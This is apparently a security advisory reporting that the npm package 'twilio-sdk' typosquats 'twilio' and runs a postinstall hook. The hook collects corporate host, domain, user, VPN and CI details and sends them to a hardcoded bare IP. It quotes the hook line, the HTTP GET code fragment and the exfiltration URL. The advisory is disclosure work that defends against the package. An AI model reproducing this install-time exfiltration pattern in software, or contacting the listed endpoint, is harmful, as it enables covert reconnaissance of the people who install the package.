summary: twilio-sdk typosquats `twilio` and exfiltrates corporate reconnaissance data on install
details: Package name `twilio-sdk` impersonates the legitimate `twilio` npm package. The `postinstall` lifecycle hook (package.json line 6: `"postinstall": "node./postinstall.js"`) runs `postinstall.js`, which collects installer fingerprinting data — hostname, reverse-DNS FQDN, Active Directory domain (USERDNSDOMAIN, USERDOMAIN, LOGONSERVER), username, USERPROFILE path, corporate VPN/proxy client indicators (Pulse, Cisco AnyConnect, GlobalProtect, FortiClient, ZScaler, Netskope), CI repository identifiers (GitHub/GitLab/Bitbucket/CircleCI/Travis/Jenkins/Azure), npm registry URL, and current working directory — and HTTP-GETs them to the hardcoded bare IP `http://46.224.67.169:3000/ping?pkg=twilio-sdk&...` over plaintext HTTP (postinstall.js line 50, line 69 `require('http').get(url, {timeout: 5000},...)`). The destination is a bare IP on Iranian network space with no relationship to Twilio or any legitimate publisher. The combination of typosquat name targeting a top-tier registry package, automatic execution at install time, harvest of Active Directory domain plus corporate VPN posture, and plaintext exfiltration to an unattributed bare IP is a corporate-network reconnaissance pattern preparing for follow-on intrusion.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
